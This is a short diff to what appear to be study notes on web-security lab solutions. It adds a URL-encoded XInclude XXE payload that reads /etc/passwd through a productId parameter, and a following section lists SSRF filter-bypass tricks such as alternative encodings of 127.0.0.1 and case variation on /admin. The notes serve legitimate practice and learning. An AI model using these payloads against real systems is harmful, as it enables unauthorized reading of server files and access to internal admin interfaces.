@@ -84,7 +84,9 @@ productId=<food+xmlns%3axi%3d"http%3a//www.w3.org/2001/XInclude"><xi%3ainclude+p
 ```
 
 - ==Discovering vulnerabilities quickly with targeted scanning==
-  
+  ```
+  productId=<food+xmlns%3axi%3d"http%3a//www.w3.org/2001/XInclude"><xi%3ainclude+parse%3d"text"+href%3d"file%3a///etc/passwd"/></food>&storeId=1
+  ```
 --- 
 ## SSRF Vulnerabilities:
 - ==SSRF with blacklist-based input filter== - Experiment with different forms of localhost: e.g.: Use an alternative IP representation of 127.0.0.1, such as 2130706433, 017700000001, or 127.1 and case variation for /admin, e.g. /Admin. 
